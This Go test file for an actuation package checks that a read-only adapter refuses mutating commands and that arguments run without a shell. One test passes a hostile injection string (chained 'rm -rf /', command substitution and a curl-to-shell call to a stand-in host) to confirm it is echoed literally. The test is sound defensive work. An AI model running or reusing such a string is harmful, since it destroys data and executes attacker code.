package actuation

import (
	"context"
	"strings"
	"testing"
)

func TestReadOnlyReference(t *testing.T) {
	a := LocalReadOnly{Cap: "shell.readonly"}
	if !a.ReadOnly() || a.Capability() != "shell.readonly" {
		t.Fatal("reference adapter must be read-only with its declared capability")
	}
}

func TestEmptyArgvRejected(t *testing.T) {
	if _, err := (LocalReadOnly{}).Exec(context.Background(), nil, nil); err != ErrEmptyArgv {
		t.Fatalf("empty argv must be rejected, got %v", err)
	}
}

// The security property: shell metacharacters in an ARGUMENT are passed literally and cannot alter
// the executed program (there is no shell to interpret them). We echo a hostile string and confirm
// it is emitted verbatim rather than executed. Exercised via LocalRunner (the argv executor); LocalReadOnly
// itself refuses to actuate (TestReadOnlyAdapterRefusesMutation) — both flow through the same runArgv choke.
func TestArgvMetacharsAreLiteral(t *testing.T) {
	hostile := "web01; rm -rf / && curl evil$(id)`whoami`|sh"
	res, err := LocalRunner{}.Run(context.Background(), []string{"echo", hostile}, nil)
	if err != nil {
		t.Fatalf("exec: %v", err)
	}
	got := strings.TrimRight(string(res.Stdout), "\n")
	if got != hostile {
		t.Fatalf("argument was not treated literally:\n got:  %q\n want: %q", got, hostile)
	}
	// Nothing named "rm", "curl", "id", "whoami" was executed — the whole string was one echo arg.
}

// A non-zero exit is a Result (with ExitCode), not a Go error.
func TestNonZeroExitIsResult(t *testing.T) {
	res, err := LocalRunner{}.Run(context.Background(), []string{"false"}, nil)
	if err != nil {
		t.Fatalf("non-zero exit must not be a Go error, got %v", err)
	}
	if res.ExitCode == 0 {
		t.Fatal("expected non-zero exit code from `false`")
	}
}

// A1 (integration-audit): the read-only reference adapter — the fail-closed DEFAULT effect leaf when no SSH
// leaf is configured — REFUSES to execute a mutating argv rather than running it locally in the worker, even
// when the interceptor's mode chokepoint has already admitted the mutation (an actuating mode wired to no real
// effect leaf). This makes "mode actuating ⇒ effect leaf can actuate" a DESIGNED floor, not one that relies
// incidentally on the distroless image lacking systemctl/docker.
func TestReadOnlyAdapterRefusesMutation(t *testing.T) {
	_, err := LocalReadOnly{Cap: "t"}.Exec(context.Background(), []string{"systemctl", "restart", "nginx"}, nil)
	if err != ErrMutatingBlocked {
		t.Fatalf("read-only adapter must refuse to actuate a mutation, got %v", err)
	}
	// empty argv is still rejected as empty (checked before the mutation refusal)
	if _, err := (LocalReadOnly{}).Exec(context.Background(), nil, nil); err != ErrEmptyArgv {
		t.Fatalf("empty argv must be rejected as empty, got %v", err)
	}
}
